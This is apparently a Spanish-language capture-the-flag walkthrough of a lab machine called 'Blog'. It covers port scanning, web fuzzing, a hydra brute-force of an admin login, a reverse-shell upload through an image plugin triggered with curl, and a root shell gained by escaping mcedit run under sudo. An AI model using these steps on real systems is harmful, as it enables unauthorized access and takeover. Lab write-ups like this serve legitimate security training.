# Máquina Blog

### Reconocimiento de la Ip de la máquina víctima

![alt text](image.png)

### Puertos abiertos

sudo nmap -sS --disable-arp-ping --min-rate 6000 -p- --open -vvv -Pn 192.168.5.162

![alt text](image-1.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 192.168.5.162

![alt text](image-2.png)

### Fuzzing web

feroxbuster --url http://192.168.5.162/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

![alt text](image-3.png)

entonces busqué por archivos php, txt

feroxbuster --url http://192.168.5.162/my_weblog/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,txt -d 5 --threads 50

![alt text](image-4.png)

entramos en la web

![alt text](image-5.png)

Utilizando hydra:

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.5.162 http-post-form "/my_weblog/admin.php:username=^USER^&password=^PASS^:F=Incorrect" -I -f -V

![alt text](image-6.png)

### Explotación

Iniciamos sesión con las credenciales encontradas:

No dirigimos a plugins y luego a My image y subimos una reverse shell

![alt text](image-7.png)

colocamos netcat a la escucha y ejecutamos el comando:

curl http://192.168.5.162/my_weblog/content/private/plugins/my_image/image.php

![alt text](image-8.png)

![alt text](image-9.png)

![alt text](image-10.png)

### Escalar privilegios

![alt text](image-11.png)

ejecuto

sudo /usr/bin/mcedit

Se abre el editor y luego hacemos alt + f y luego:

File > user menu > invoke shell

### user.txt

![alt text](image-12.png)

### root.txt

![alt text](image-13.png)

